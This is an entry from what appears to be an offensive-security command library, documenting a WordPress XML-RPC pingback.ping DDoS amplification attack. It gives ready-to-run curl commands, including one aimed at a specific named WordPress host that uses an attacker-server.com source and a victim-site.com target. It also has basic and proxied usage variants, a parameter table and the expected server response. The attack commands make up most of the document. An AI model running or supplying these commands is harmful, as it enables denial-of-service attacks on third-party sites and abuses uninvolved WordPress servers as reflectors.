---
id: cmd-pingback-dos
data: >-
  curl -X POST http://www.iandunn.name/xmlrpc.php -H "Content-Type: text/xml" -H
  "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101
  Firefox/70.0" -d
  '<methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://attacker-server.com/monitored</string></value></param><param><value><string>https://victim-site.com</string></value></param></params></methodCall>'
tags:
  - ddos
  - wordpress
type: command
output: >-
  HTTP 200 OK with XML response indicating pingback success, triggering outbound
  requests to the target
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:30.328Z'
verified: false
validated: true
submitted: true
---
# pingback-dos-amplification

## Command

```bash
curl -X POST http://www.iandunn.name/xmlrpc.php \
  -H "Content-Type: text/xml" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0" \
  -d '<methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://attacker-server.com/monitored</string></value></param><param><value><string>https://victim-site.com</string></value></param></params></methodCall>'
```

## Description

Abuses the XML-RPC pingback.ping method to perform DDoS amplification by making the WordPress server send requests to a victim site from its IP.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies POST method | Yes |
| `http://target/xmlrpc.php` | Target endpoint URL | Yes |
| `-H "Content-Type: text/xml"` | Sets XML content type | Yes |
| `params[0]` | Source URL (attacker's server) | Yes |
| `params[1]` | Target URL (victim site) | Yes |

## Examples

### Basic Usage

```bash
curl -X POST http://target.com/xmlrpc.php -H "Content-Type: text/xml" -d '<methodCall><methodName>pingback.ping</methodName><params><param><string>http://source.com</string></param><param><string>https://victim.com</string></param></params></methodCall>'
```

### Advanced Usage

```bash
curl -X POST https://target.com/xmlrpc.php -H "Content-Type: text/xml" -d '<methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://source.com</string></value></param><param><value><string>https://victim.com</string></value></param></params></methodCall>' --proxy burp:8080
```

## Expected Output

HTTP 200 OK with XML like: <params><param><value><boolean>1</boolean></value></param></params>, followed by server-initiated requests to the victim.

## Related

- [[commands/list-xmlrpc-methods]]
- [[procedures/Demonstrate-DDoS-via-Pingback]]
